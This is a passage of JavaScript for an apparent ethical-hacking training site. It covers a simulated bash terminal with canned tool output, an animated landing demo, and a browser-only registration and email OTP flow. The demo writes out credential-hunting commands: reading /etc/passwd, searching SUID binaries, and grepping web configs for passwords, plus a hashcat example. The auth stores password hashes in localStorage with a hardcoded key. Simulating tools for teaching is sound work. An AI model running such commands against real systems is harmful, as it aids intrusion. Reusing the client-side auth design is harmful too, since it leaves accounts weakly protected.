  if (cleanCmd.startsWith('wget')) return info('--2024-01-15 09:14:22--\nResolving host...\nConnecting... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 12345 (12K)\nSaved: \'file.txt\' [12345/12345]');

  // ‚îÄ‚îÄ tar ‚îÄ‚îÄ
  if (cleanCmd.startsWith('tar')) {
    if (cleanCmd.includes('-c')) return info('Creating archive...\nDone: archive created successfully');
    if (cleanCmd.includes('-x')) return info('Extracting archive...\nDone: files extracted');
    if (cleanCmd.includes('-t') || cleanCmd.includes('--list')) return TERM_RESPONSES['tar -tf archive.tar.gz']();
    return info('[tar: use -c to create, -x to extract, -t to list]');
  }

  // ‚îÄ‚îÄ gzip / bzip2 / xz ‚îÄ‚îÄ
  if (cleanCmd.startsWith('gzip') || cleanCmd.startsWith('gunzip') || cleanCmd.startsWith('bzip2') || cleanCmd.startsWith('xz')) return ok('');

  // ‚îÄ‚îÄ 7z ‚îÄ‚îÄ
  if (cleanCmd.startsWith('7z')) return info('7-Zip 22.01 (x64) : Copyright (c) 1999-2022 Igor Pavlov\nProcessing archive: file.7z\nEverything is Ok\nFiles: 5, Size: 54321');

  // ‚îÄ‚îÄ man ‚îÄ‚îÄ
  if (cleanCmd.startsWith('man ')) {
    const pg = cleanCmd.slice(4).trim();
    return info('MAN PAGE: ' + pg.toUpperCase() + '(1)\n\nNAME\n    ' + pg + ' ‚Äî ' + (pg==='nmap'?'network exploration and security scanner':pg==='grep'?'print lines matching a pattern':pg==='find'?'search for files in directory hierarchy':pg==='chmod'?'change file mode bits':'command reference') + '\n\nSYNOPSIS\n    ' + pg + ' [OPTIONS] [ARGUMENTS]\n\n[Press q to exit ‚Äî simulated; type another command to continue]');
  }

  // ‚îÄ‚îÄ awk / sed / cut / sort / uniq / wc ‚îÄ‚îÄ
  if (cleanCmd.startsWith('awk')) return TERM_RESPONSES["awk -F: '{print $1}' /etc/passwd"]();
  if (cleanCmd.startsWith('sed')) return info('[sed: stream editor output would appear here]');
  if (cleanCmd.startsWith('cut')) return TERM_RESPONSES['cut -d: -f1 /etc/passwd']();
  if (cleanCmd.startsWith('sort')) return info('[sorted output]');
  if (cleanCmd.startsWith('uniq')) return info('[deduplicated output]');
  if (cleanCmd.startsWith('wc')) return info('      7      14     312 /etc/passwd');
  if (cleanCmd.startsWith('head')) return info('First 10 lines of file...\n[output would appear here]');
  if (cleanCmd.startsWith('tail')) return info('Last 10 lines of file...\nJan 15 09:14:22 hackpath sshd[5490]: Accepted password for kali');

  // ‚îÄ‚îÄ network tools ‚îÄ‚îÄ
  if (cleanCmd.startsWith('netstat')) return TERM_RESPONSES['netstat -tuln']();
  if (cleanCmd.startsWith('ss')) return TERM_RESPONSES['ss -tuln']();
  if (cleanCmd.startsWith('ifconfig')) return TERM_RESPONSES['ifconfig']();
  if (cleanCmd.startsWith('ip addr') || cleanCmd.startsWith('ip a')) return TERM_RESPONSES['ip addr']();
  if (cleanCmd.startsWith('ip route') || cleanCmd.startsWith('ip r')) return TERM_RESPONSES['ip route']();
  if (cleanCmd.startsWith('ip ')) return info('[ip command output]');
  if (cleanCmd.startsWith('macchanger')) return info('Current MAC:   08:00:27:ab:cd:ef (CADMUS COMPUTER SYSTEMS)\nPermanent MAC: 08:00:27:ab:cd:ef (CADMUS COMPUTER SYSTEMS)\nNew MAC:       dc:a6:32:f9:c1:42 (Raspberry Pi Trading Ltd)');
  if (cleanCmd.startsWith('dig') || cleanCmd.startsWith('nslookup')) {
    const host = cleanCmd.split(' ').slice(-1)[0];
    return info('Server:\t\t8.8.8.8\nAddress:\t8.8.8.8#53\n\nNon-authoritative answer:\nName:\t' + host + '\nAddress: 93.184.216.34');
  }

  // ‚îÄ‚îÄ kernel / modules ‚îÄ‚îÄ
  if (cleanCmd.startsWith('lsmod')) return TERM_RESPONSES['lsmod']();
  if (cleanCmd.startsWith('modinfo')) return TERM_RESPONSES['modinfo kvm']();
  if (cleanCmd.startsWith('modprobe') || cleanCmd.startsWith('insmod') || cleanCmd.startsWith('rmmod')) return ok('');

  // ‚îÄ‚îÄ stat / file / strings / xxd ‚îÄ‚îÄ
  if (cleanCmd.startsWith('stat')) {
    const f = cleanCmd.split(' ').slice(-1)[0];
    return info('  File: ' + f + '\n  Size: 4096\t\tBlocks: 8\tIO Block: 4096\nAccess: 2024-01-15 09:14:22.000000000\nModify: 2024-01-15 08:00:01.000000000\nChange: 2024-01-15 08:00:01.000000000');
  }
  if (cleanCmd.startsWith('file ')) {
    const f = cleanCmd.slice(5).trim();
    if (f.endsWith('.sh')) return ok(f + ': Bourne-Again shell script, ASCII text executable');
    if (f.endsWith('.py')) return ok(f + ': Python script, ASCII text executable');
    if (f.endsWith('.txt')) return ok(f + ': ASCII text');
    return ok(f + ': ELF 64-bit LSB executable, x86-64, dynamically linked (GLIBC 2.35)');
  }
  if (cleanCmd.startsWith('strings')) return info('[printable strings from binary ‚Äî passwords, URLs, file paths often visible here]');
  if (cleanCmd.startsWith('xxd')) return info('00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............\n00000010: 0300 3e00 0100 0000 4010 4000 0000 0000  ..>.....@.@.....');

  // ‚îÄ‚îÄ misc builtins ‚îÄ‚îÄ
  if (cleanCmd.startsWith('export')) return ok('');
  if (cleanCmd.startsWith('source') || cleanCmd.startsWith('. ')) return ok('');
  if (cleanCmd === 'history -c' || cleanCmd === 'history -w') return ok('');
  if (cleanCmd.startsWith('history')) return TERM_RESPONSES['history']();
  if (cleanCmd === 'jobs') return ok('[1]+  Running   nmap -sV 192.168.1.50 &');
  if (cleanCmd.startsWith('fg') || cleanCmd.startsWith('bg')) return info('[job resumed]');
  if (cleanCmd.startsWith('kill')) return ok('');
  if (cleanCmd === 'last') return TERM_RESPONSES['last']();
  if (cleanCmd === 'lastlog') return TERM_RESPONSES['lastlog']();
  if (cleanCmd.startsWith('crontab')) return TERM_RESPONSES['crontab -l']();
  if (cleanCmd.startsWith('dd ')) return err('Warning: dd simulated ‚Äî not executed (protects your system)');
  if (cleanCmd.startsWith('lsof')) return info('COMMAND   PID  USER   FD  TYPE  DEVICE  SIZE/OFF  NODE NAME\nsshd      401  root    3u  IPv4    9823    0t0  TCP *:22 (LISTEN)\napache2   512  root    4u  IPv4    9841    0t0  TCP *:80 (LISTEN)\nmysqld    613 mysql    9u  IPv4    9960    0t0  TCP *:3306 (LISTEN)');
  if (cleanCmd.startsWith('strace') || cleanCmd.startsWith('ltrace')) return info('[system call trace ‚Äî requires the target program]');
  if (cleanCmd.startsWith('nc ') || cleanCmd.startsWith('netcat')) return info('[netcat] listening...\n[In a real terminal, nc would open a TCP connection]');
  if (cleanCmd.startsWith('tcpdump')) return info('tcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n09:14:22.123456 IP 192.168.1.101.41234 > 192.168.1.1.80: Flags [S], seq 1234567890');
  if (cleanCmd.startsWith('airmon') || cleanCmd.startsWith('airodump') || cleanCmd.startsWith('aireplay') || cleanCmd.startsWith('aircrack')) return info('[Wireless tool ‚Äî requires a physical wireless adapter in monitor mode]');
  if (cleanCmd.startsWith('hashcat') || cleanCmd.startsWith('john')) return info('[Password cracker ‚Äî requires a hash file and wordlist]\nExample: hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt');
  if (cleanCmd.startsWith('msfconsole') || cleanCmd.startsWith('msfvenom')) return info('[Metasploit Framework ‚Äî type msfconsole to launch]\n\nThis is a simulation ‚Äî the full Metasploit console is available in a real Kali Linux environment.');
  if (cleanCmd.startsWith('sqlmap')) return info('[sqlmap ‚Äî automated SQL injection tool]\nsqlmap identified 2 injectable parameters.\nParameter: id (GET)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind');
  if (cleanCmd.startsWith('git')) return info('Initialized empty Git repository / cloning... done');
  if (cleanCmd.startsWith('service')) return info('[service output ‚Äî use systemctl on modern Kali]');

  // Pipe handling ‚Äî run left side
  if (cleanCmd.includes('|')) {
    const left = cleanCmd.split('|')[0].trim();
    return resolveCmd(left);
  }

  // Unknown
  return err('bash: ' + cleanCmd.split(' ')[0] + ': command not found');
}

// Create an interactive terminal widget
function makeInteractiveTerm(id, label) {
  return `<div class="iterm" id="iterm-${id}">
    <div class="iterm-head">
      <div class="iterm-dots"><div class="iterm-dot r"></div><div class="iterm-dot o"></div><div class="iterm-dot g"></div></div>
      <div class="iterm-label">${label || 'BASH TERMINAL ‚Äî kali@hackpath'}</div>
      <div class="iterm-hint">INTERACTIVE ‚Äî type commands</div>
    </div>
    <div class="iterm-body">
      <div class="iterm-history" id="ih-${id}"></div>
      <div class="iterm-input-row">
        <span class="iterm-prompt-str" id="iterm-prompt-${id}"><span class="h-prompt">kali@hackpath:~$&nbsp;</span></span>
        <input class="iterm-input" id="ii-${id}" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="type a command..." />
      </div>
    </div>
  </div>`;
}

function initInteractiveTerms() {
  document.querySelectorAll('.iterm-input').forEach(input => {
    if (input.dataset.initialized) return;
    input.dataset.initialized = '1';
    const id = input.id.replace('ii-', '');
    const hist = [];
    let histIdx = -1;
    let cwd = '/home/kali';

    const DIR_CONTENTS = {
      '/': ['bin','boot','dev','etc','home','lib','media','mnt','opt','proc','root','run','sbin','srv','sys','tmp','usr','var'],
      '/home': ['alice','bob','kali'],
      '/home/kali': ['Desktop','Documents','Downloads','Music','Pictures','tools'],
      '/etc': ['apt','bash.bashrc','cron.d','crontab','hosts','hostname','os-release','passwd','shadow','ssh','sudoers'],
      '/var/log': ['apache2','auth.log','dpkg.log','kern.log','syslog','wtmp'],
      '/tmp': [],
      '/opt': ['metasploit-framework','tools','SecLists'],
      '/usr/bin': ['bash','cat','chmod','find','grep','nmap','python3','ssh','wget','curl'],
    };

    function promptStr() {
      let p = cwd === '/home/kali' ? '~' : cwd;
      return '<span class="h-prompt">kali@hackpath:' + escHtml(p) + '$&nbsp;</span>';
    }
    function promptEl() {
      return document.getElementById('iterm-prompt-' + id);
    }

    function resolveDir(dir) {
      if (!dir || dir === '~') return '/home/kali';
      if (dir === '-') return '/var/log';
      if (dir === '..') {
        const parts = cwd.split('/').filter(Boolean);
        parts.pop();
        return parts.length ? '/' + parts.join('/') : '/';
      }
      if (dir.startsWith('/')) return dir;
      return (cwd === '/' ? '' : cwd) + '/' + dir;
    }

    input.addEventListener('keydown', e => {
      if (e.key === 'Enter') {
        const cmd = input.value.trim();
        input.value = '';
        histIdx = -1;
        if (!cmd) return;
        hist.unshift(cmd);

        const histEl = document.getElementById('ih-' + id);
        const cmdLine = document.createElement('div');
        cmdLine.innerHTML = promptStr() + '<span class="h-cmd">' + escHtml(cmd) + '</span>';
        histEl.appendChild(cmdLine);

        // Handle cd specially to update cwd
        const cleanForCd = cmd.replace(/\s*2>\/dev\/null\s*/g,'').trim();
        if (cleanForCd === 'cd' || cleanForCd === 'cd ~') {
          cwd = '/home/kali';
          const p = promptEl(); if(p) p.innerHTML = promptStr();
          input.closest('.iterm-body').scrollTop = 99999;
          return;
        }
        if (cleanForCd.startsWith('cd ')) {
          const target = cleanForCd.slice(3).trim();
          const newDir = resolveDir(target);
          // Check if dir exists in our map (or just allow it)
          cwd = newDir;
          const p = promptEl(); if(p) p.innerHTML = promptStr();
          // Show ls of new dir if known
          const contents = DIR_CONTENTS[newDir];
          if (contents && contents.length > 0) {
            const hint = document.createElement('div');
            hint.innerHTML = '<span class="h-info" style="font-size:.7rem;opacity:.5">[' + newDir + '] ‚Äî try ls</span>';
            histEl.appendChild(hint);
          }
          input.closest('.iterm-body').scrollTop = 99999;
          return;
        }

        // For ls, show contents of cwd
        if ((cleanForCd === 'ls' || cleanForCd.startsWith('ls ')) && !cleanForCd.match(/ls.*\/[a-z]/)) {
          const contents = DIR_CONTENTS[cwd] || ['(empty directory)'];
          const flags = cleanForCd.includes('-l') || cleanForCd.includes('-la');
          let out;
          if (flags) {
            out = 'total ' + (contents.length * 4) + '\n' + contents.map(f => {
              const isDir = !f.includes('.');
              return (isDir ? 'drwxr-xr-x' : '-rw-r--r--') + '  1 kali kali 4096 Jan 15 09:00 ' + f;
            }).join('\n');
          } else {
            out = contents.join('  ');
          }
          const outDiv = document.createElement('div');
          outDiv.innerHTML = '<span class="h-ok">' + escHtml(out) + '</span>';
          histEl.appendChild(outDiv);
          input.closest('.iterm-body').scrollTop = 99999;
          return;
        }

        // pwd
        if (cleanForCd === 'pwd') {
          const outDiv = document.createElement('div');
          outDiv.innerHTML = '<span class="h-ok">' + escHtml(cwd) + '</span>';
          histEl.appendChild(outDiv);
          input.closest('.iterm-body').scrollTop = 99999;
          return;
        }

        const result = resolveCmd(cmd);
        if (result === '__clear__') {
          histEl.innerHTML = '';
          input.closest('.iterm-body').scrollTop = 0;
          return;
        }
        if (result && result.text !== undefined) {
          if (result.text !== '') {
            const outDiv = document.createElement('div');
            const cls = result.type === 'err' ? 'h-err' : result.type === 'info' ? 'h-info' : 'h-ok';
            outDiv.innerHTML = '<span class="' + cls + '">' + escHtml(result.text) + '</span>';
            histEl.appendChild(outDiv);
          }
        }
        input.closest('.iterm-body').scrollTop = 99999;
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        histIdx = Math.min(histIdx + 1, hist.length - 1);
        if (hist[histIdx] !== undefined) input.value = hist[histIdx];
      } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        histIdx = Math.max(histIdx - 1, -1);
        input.value = histIdx >= 0 ? (hist[histIdx] || '') : '';
      } else if (e.key === 'Tab') {
        e.preventDefault();
        const partial = input.value;
        if (!partial) return;
        // Tab complete from command list
        const cmds = ['ls','cd','cat','grep','find','nmap','ping','ps','sudo','chmod','chown','mkdir','touch','rm','cp','mv','which','whereis','python3','apt','ssh','curl','wget','tar','systemctl','netstat','ifconfig','ip','awk','sed','cut','sort','head','tail','history','whoami','id','uname','hostname','env','echo','man','clear','file','stat','strings'];
        const match = cmds.find(c => c.startsWith(partial) && c !== partial);
        if (match) { input.value = match + ' '; return; }
        // Tab complete filenames in cwd
        const parts = partial.split(' ');
        const lastPart = parts[parts.length - 1];
        const contents = DIR_CONTENTS[cwd] || [];
        const fileMatch = contents.find(f => f.toLowerCase().startsWith(lastPart.toLowerCase()) && f !== lastPart);
        if (fileMatch) { parts[parts.length - 1] = fileMatch; input.value = parts.join(' '); }
      }
    });

    // Tap anywhere focuses
    input.closest('.iterm').addEventListener('click', e => {
      if (e.target !== input) input.focus();
    });
  });
}

function escHtml(t) {
  return String(t).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');
}



// =================== LANDING PAGE ===================
const LAND_DEMO_SEQUENCE = [
  { cmd: 'whoami',                           out: 'kali',                           type: 'ok' },
  { cmd: 'nmap -sV 192.168.1.50',           out: 'PORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 7.9\n80/tcp   open  http     Apache 2.4.38\n3306/tcp open  mysql    MySQL 5.7.33', type: 'info' },
  { cmd: 'find / -perm -4000 2>/dev/null',  out: '/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/su', type: 'ok' },
  { cmd: 'cat /etc/passwd | cut -d: -f1',   out: 'root\ndaemon\nkali\nalice\nbob', type: 'ok' },
  { cmd: 'grep -r "password" /var/www/html 2>/dev/null', out: '/var/www/html/config.php:$db_password = "S3cur3P@ss!";\n/var/www/html/wp-config.php:define("DB_PASSWORD", "wordpress_pass");', type: 'info' },
  { cmd: 'python3 -c "import socket; s=socket.socket(); s.connect((\'192.168.1.50\',80))"', out: '[+] Connected to 192.168.1.50:80', type: 'ok' },
];

let landDemoIdx = 0;
let landDemoTyping = false;
let landDemoTimer = null;

function runLandDemo() {
  const body = document.getElementById('land-term-demo');
  if (!body) return;
  const seq = LAND_DEMO_SEQUENCE[landDemoIdx % LAND_DEMO_SEQUENCE.length];

  // Add prompt + animate typing
  const row = document.createElement('div');
  row.innerHTML = '<span class="lt-p">kali@hackpath:~$&nbsp;</span><span class="lt-c" id="ltd-typing"></span><span class="lt-cursor"></span>';
  body.appendChild(row);
  body.scrollTop = 9999;

  let i = 0;
  const typeInterval = setInterval(() => {
    const el = document.getElementById('ltd-typing');
    if (!el) { clearInterval(typeInterval); return; }
    if (i < seq.cmd.length) {
      el.textContent += seq.cmd[i++];
      body.scrollTop = 9999;
    } else {
      clearInterval(typeInterval);
      // Remove cursor from typed line
      const cursor = row.querySelector('.lt-cursor');
      if (cursor) cursor.remove();

      setTimeout(() => {
        // Add output
        const outDiv = document.createElement('div');
        const cls = seq.type === 'info' ? 'lt-info' : seq.type === 'ok' ? 'lt-g' : 'lt-r';
        outDiv.innerHTML = '<span class="' + cls + '">' + escHtmlLand(seq.out) + '</span>';
        body.appendChild(outDiv);

        // Add next prompt
        const nextRow = document.createElement('div');
        nextRow.innerHTML = '<span class="lt-p">kali@hackpath:~$&nbsp;</span><span class="lt-cursor"></span>';
        body.appendChild(nextRow);
        body.scrollTop = 9999;

        // Trim old lines if too long
        while (body.children.length > 18) body.removeChild(body.firstChild);

        landDemoIdx++;
        landDemoTimer = setTimeout(runLandDemo, 2800);
      }, 350);
    }
  }, 38);
}

function escHtmlLand(t) {
  return String(t).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');
}

function startLandDemo() {
  if (landDemoTimer) clearTimeout(landDemoTimer);
  const body = document.getElementById('land-term-demo');
  if (body) body.innerHTML = '';
  landDemoIdx = 0;
  setTimeout(runLandDemo, 800);
}

function populateLandModules() {
  const grid = document.getElementById('land-modules-grid');
  if (!grid || typeof CHAPTERS === 'undefined') return;
  grid.innerHTML = CHAPTERS.map((ch, i) => `
    <div class="land-module" style="animation:fadeUp .4s ${i*0.04}s both">
      <div class="land-module-num">MODULE ${String(ch.num).padStart(2,'0')}</div>
      <span class="land-module-icon">${ch.icon}</span>
      <div class="land-module-title">${ch.title}</div>
    </div>
  `).join('');
}

function landScrollTo(id) {
  const el = document.getElementById(id);
  if (el) el.scrollIntoView({behavior:'smooth', block:'start'});
}

function showLanding() {
  document.getElementById('view-landing').style.display = 'block';
  document.getElementById('view-auth').style.display = 'none';
  document.querySelector('nav').style.display = 'none';
  document.querySelectorAll('.view').forEach(v => { v.classList.remove('active'); });
  populateLandModules();
  startLandDemo();
}

function showAuth(tab) {
  if (landDemoTimer) clearTimeout(landDemoTimer);
  document.getElementById('view-landing').style.display = 'none';
  document.getElementById('view-auth').style.display = 'flex';
  switchAuthTab(tab || 'register');
  window.scrollTo(0,0);
}

// =================== AUTH SYSTEM ===================
// EmailJS credentials
const EJS_SERVICE  = 'hackpath_service';
const EJS_TEMPLATE = 'template_3fk1ppg';
const EJS_KEY      = 'xcC_todLlzJs_TXqb';

const AUTH_KEY  = 'hp_users';
const LOGIN_KEY = 'hp_session';

// ‚îÄ‚îÄ OTP state (never persisted to localStorage) ‚îÄ‚îÄ
let _otpState = null; // { hash, expiresAt, email, name, passHash, attempts, resendAt }
let _otpTimerInterval = null;

// ‚îÄ‚îÄ Crypto helpers ‚îÄ‚îÄ
async function sha256(str) {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
}

function genOTP() {
  // Cryptographically random 6-digit OTP
  const arr = new Uint32Array(1);
  crypto.getRandomValues(arr);
  return String(100000 + (arr[0] % 900000));
}

// ‚îÄ‚îÄ Storage helpers ‚îÄ‚îÄ
function getUsers() {
  try { return JSON.parse(localStorage.getItem(AUTH_KEY) || '{}'); } catch(e) { return {}; }
}
function saveUsers(u) { localStorage.setItem(AUTH_KEY, JSON.stringify(u)); }
function getCurrentUser() {
  try { return JSON.parse(localStorage.getItem(LOGIN_KEY) || 'null'); } catch(e) { return null; }
}
function setCurrentUser(u) { localStorage.setItem(LOGIN_KEY, JSON.stringify(u)); }
function clearCurrentUser() { localStorage.removeItem(LOGIN_KEY); }

// ‚îÄ‚îÄ Tab switching ‚îÄ‚îÄ
function switchAuthTab(tab) {
  const panels = ['login','register','otp'];
  panels.forEach(p => {
    document.getElementById('panel-' + p).classList.toggle('active', p === tab);
  });
  const tabs = ['login','register'];
  tabs.forEach(t => {
    const el = document.getElementById('tab-' + t);
    if (el) el.classList.toggle('active', t === tab);
  });
  ['l-err','r-err','r-ok','otp-err','otp-ok'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.textContent = '';
  });
  if (tab !== 'otp') { stopOTPTimer(); }
}

// ‚îÄ‚îÄ Password strength ‚îÄ‚îÄ
function checkStrength(pass) {
  const fill  = document.getElementById('strength-fill');
  const label = document.getElementById('strength-label');
  if (!fill || !pass) { if(fill) fill.style.width='0%'; if(label) label.textContent=''; return; }
  let score = 0;
  if (pass.length >= 8)  score++;
  if (pass.length >= 12) score++;
  if (/[A-Z]/.test(pass)) score++;
  if (/[0-9]/.test(pass)) score++;
  if (/[^A-Za-z0-9]/.test(pass)) score++;
  const levels = [
    { pct:'20%', color:'#ff3366', text:'// VERY WEAK' },
    { pct:'40%', color:'#ff8c00', text:'// WEAK' },
    { pct:'60%', color:'#ffd700', text:'// FAIR' },
    { pct:'80%', color:'#00d4ff', text:'// STRONG' },
    { pct:'100%',color:'#00ff88', text:'// VERY STRONG ‚úì' },
  ];
  const lvl = levels[Math.min(score, 4)];
  fill.style.width    = lvl.pct;
  fill.style.background = lvl.color;
  label.textContent   = lvl.text;
  label.style.color   = lvl.color;
}

// ‚îÄ‚îÄ OTP digit input wiring ‚îÄ‚îÄ
function initOTPInputs() {
  for (let i = 0; i < 6; i++) {
    const el = document.getElementById('otp-' + i);
    if (!el) continue;
    el.addEventListener('input', e => {
      el.classList.toggle('filled', !!el.value);
      el.value = el.value.replace(/[^0-9]/g,'').slice(-1);
      if (el.value && i < 5) document.getElementById('otp-' + (i+1)).focus();
      // Auto-verify when all filled
      const code = getOTPValue();
      if (code.length === 6) verifyOTP();
    });
    el.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !el.value && i > 0) {
        document.getElementById('otp-' + (i-1)).focus();
      }
    });
    el.addEventListener('paste', e => {
      e.preventDefault();
      const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
      pasted.split('').forEach((ch, idx) => {
        const d = document.getElementById('otp-' + idx);
        if (d) { d.value = ch; d.classList.add('filled'); }
      });
      if (pasted.length === 6) verifyOTP();
    });
  }
}

function getOTPValue() {
  return Array.from({length:6}, (_,i) => (document.getElementById('otp-'+i)||{}).value||'').join('');
}

function clearOTPInputs() {
  for (let i = 0; i < 6; i++) {
    const el = document.getElementById('otp-'+i);
    if (el) { el.value = ''; el.classList.remove('filled','error'); }
  }
}

function shakeOTPInputs() {
  for (let i = 0; i < 6; i++) {
    const el = document.getElementById('otp-'+i);
    if (el) { el.classList.add('error'); setTimeout(()=>el.classList.remove('error'),400); }
  }
}

// ‚îÄ‚îÄ OTP countdown timer ‚îÄ‚îÄ
function startOTPTimer(expiresAt) {
  stopOTPTimer();
  const timerEl    = document.getElementById('otp-timer');
  const countdownEl= document.getElementById('otp-countdown');
  const resendBtn  = document.getElementById('otp-resend-btn');

  _otpTimerInterval = setInterval(() => {
    const remaining = Math.max(0, expiresAt - Date.now());
    const mins = Math.floor(remaining / 60000);
    const secs = Math.floor((remaining % 60000) / 1000);
    if (countdownEl) countdownEl.textContent = `${mins}:${String(secs).padStart(2,'0')}`;

    if (remaining <= 0) {
      stopOTPTimer();
      if (timerEl) { timerEl.classList.add('expired'); timerEl.innerHTML = '// Code expired ‚Äî request a new one'; }
      if (resendBtn) resendBtn.disabled = false;
      document.getElementById('otp-verify-btn').disabled = true;
    }

    // Enable resend after 60 seconds
    if (_otpState && Date.now() > _otpState.resendAt && resendBtn) {
      resendBtn.disabled = false;
    }
  }, 500);
}

function stopOTPTimer() {
  if (_otpTimerInterval) { clearInterval(_otpTimerInterval); _otpTimerInterval = null; }
}

// ‚îÄ‚îÄ Show sending spinner ‚îÄ‚îÄ
function setRegBtn(state) {
  const btn = document.getElementById('r-submit-btn');
  if (!btn) return;
  if (state === 'loading') {
    btn.disabled = true;
    btn.innerHTML = '<span style="display:flex;align-items:center;justify-content:center;gap:.5rem"><span style="font-size:.8rem">SENDING</span><span class="otp-sending"><span class="otp-sending-dot"></span><span class="otp-sending-dot"></span><span class="otp-sending-dot"></span></span></span>';
  } else {
    btn.disabled = false;
    btn.innerHTML = 'SEND VERIFICATION CODE ‚Üí';
  }
}

// ‚îÄ‚îÄ Send OTP via EmailJS ‚îÄ‚îÄ
async function sendOTPEmail(toEmail, toName, otpCode) {
  await emailjs.init(EJS_KEY);
  return emailjs.send(EJS_SERVICE, EJS_TEMPLATE, {
    to_email: toEmail,
    to_name:  toName,
    otp_code: otpCode,
  });
}

// ‚îÄ‚îÄ REGISTER: validate then send OTP ‚îÄ‚îÄ
async function doRegister() {
  const name  = document.getElementById('r-name').value.trim();
  const email = document.getElementById('r-email').value.trim().toLowerCase();
  const pass  = document.getElementById('r-pass').value;
  const pass2 = document.getElementById('r-pass2').value;
  const errEl = document.getElementById('r-err');
  const okEl  = document.getElementById('r-ok');
  errEl.textContent = '';
  okEl.textContent  = '';

  // Validation
  if (!name)                          return errEl.textContent = '// Full name is required';
  if (name.length < 2)                return errEl.textContent = '// Please enter your real name';
  if (!email || !email.includes('@') || !email.includes('.'))
                                       return errEl.textContent = '// Enter a valid email address';
  if (pass.length < 8)                return errEl.textContent = '// Password must be at least 8 characters';
  if (!/[A-Z]/.test(pass))            return errEl.textContent = '// Password needs at least one uppercase letter';
  if (!/[0-9]/.test(pass))            return errEl.textContent = '// Password needs at least one number';
  if (pass !== pass2)                 return errEl.textContent = '// Passwords do not match';

  const users = getUsers();
  if (users[email] && users[email].verified)
    return errEl.textContent = '// Account already exists ‚Äî sign in instead';

  setRegBtn('loading');

  try {
    // Generate OTP + hash it (never store plain OTP)
    const otp     = genOTP();
    const salt    = crypto.randomUUID();
    const otpHash = await sha256(otp + salt + email);
    const passHash= await sha256(pass + email + 'hp_v2_2024');

    _otpState = {
      hash:      otpHash,
      salt:      salt,
      expiresAt: Date.now() + 10 * 60 * 1000, // 10 minutes
      resendAt:  Date.now() + 60 * 1000,       // resend after 60s
      email, name, passHash,
      attempts:  0,
    };

    await sendOTPEmail(email, name, otp);

    // Show OTP panel
    setRegBtn('ready');
    document.getElementById('otp-email-display').textContent = email;
    clearOTPInputs();
    document.getElementById('otp-verify-btn').disabled = false;
    document.getElementById('otp-resend-btn').disabled  = true;
    const timerEl = document.getElementById('otp-timer');
    if (timerEl) { timerEl.classList.remove('expired'); timerEl.innerHTML = 'Code expires in <span id="otp-countdown">10:00</span>'; }

    switchAuthTab('otp');
    startOTPTimer(_otpState.expiresAt);
    setTimeout(() => { const d = document.getElementById('otp-0'); if(d) d.focus(); }, 200);

  } catch(err) {
    setRegBtn('ready');
    console.error('EmailJS error:', err);
    errEl.textContent = '// Failed to send email ‚Äî check your EmailJS setup or try again';
  }
}

// ‚îÄ‚îÄ VERIFY OTP ‚îÄ‚îÄ
async function verifyOTP() {
  const errEl = document.getElementById('otp-err');
  const okEl  = document.getElementById('otp-ok');
  errEl.textContent = '';
  okEl.textContent  = '';

  if (!_otpState) return errEl.textContent = '// Session expired ‚Äî please register again';
  if (Date.now() > _otpState.expiresAt) return errEl.textContent = '// Code expired ‚Äî request a new one';

  _otpState.attempts++;
  if (_otpState.attempts > 5) {
    shakeOTPInputs();
    return errEl.textContent = '// Too many attempts ‚Äî please register again';
  }

  const entered = getOTPValue();
  if (entered.length !== 6) return errEl.textContent = '// Enter all 6 digits';

  const btn = document.getElementById('otp-verify-btn');
  btn.disabled = true;
  btn.textContent = 'VERIFYING...';

  const enteredHash = await sha256(entered + _otpState.salt + _otpState.email);

  if (enteredHash !== _otpState.hash) {
    shakeOTPInputs();
    clearOTPInputs();
    document.getElementById('otp-0').focus();
    btn.disabled = false;
    btn.textContent = 'VERIFY & CREATE ACCOUNT ‚Üí';
    const left = 5 - _otpState.attempts;
    return errEl.textContent = `// Incorrect code ‚Äî ${left} attempt${left===1?'':'s'} remaining`;
  }

  // OTP correct ‚Äî create account
  okEl.textContent = '// Verified! Creating your account...';
  stopOTPTimer();

  const users = getUsers();
  users[_otpState.email] = {
    name:       _otpState.name,
    email:      _otpState.email,
    password:   _otpState.passHash,
    verified:   true,
    created:    new Date().toISOString(),
    xp:         0,
    completed:  [],
    lessonDone: {},
  };
  saveUsers(users);
  _otpState = null;

  const createdEmail = users[Object.keys(users).slice(-1)[0]].email;
  setTimeout(() => loginUser(users[createdEmail]), 800);
}

// ‚îÄ‚îÄ RESEND OTP ‚îÄ‚îÄ
async function resendOTP() {
  if (!_otpState) return;
  const errEl = document.getElementById('otp-err');
  const okEl  = document.getElementById('otp-ok');
  errEl.textContent = '';
  okEl.textContent  = '';

  const resendBtn = document.getElementById('otp-resend-btn');
  resendBtn.disabled = true;

  try {
    const otp     = genOTP();
    const salt    = crypto.randomUUID();
    const otpHash = await sha256(otp + salt + _otpState.email);

    _otpState.hash      = otpHash;
    _otpState.salt      = salt;
    _otpState.expiresAt = Date.now() + 10 * 60 * 1000;
    _otpState.resendAt  = Date.now() + 60 * 1000;
    _otpState.attempts  = 0;

    await sendOTPEmail(_otpState.email, _otpState.name, otp);

    clearOTPInputs();
    document.getElementById('otp-0').focus();
    document.getElementById('otp-verify-btn').disabled = false;
    const timerEl = document.getElementById('otp-timer');
    if (timerEl) { timerEl.classList.remove('expired'); timerEl.innerHTML = 'Code expires in <span id="otp-countdown">10:00</span>'; }
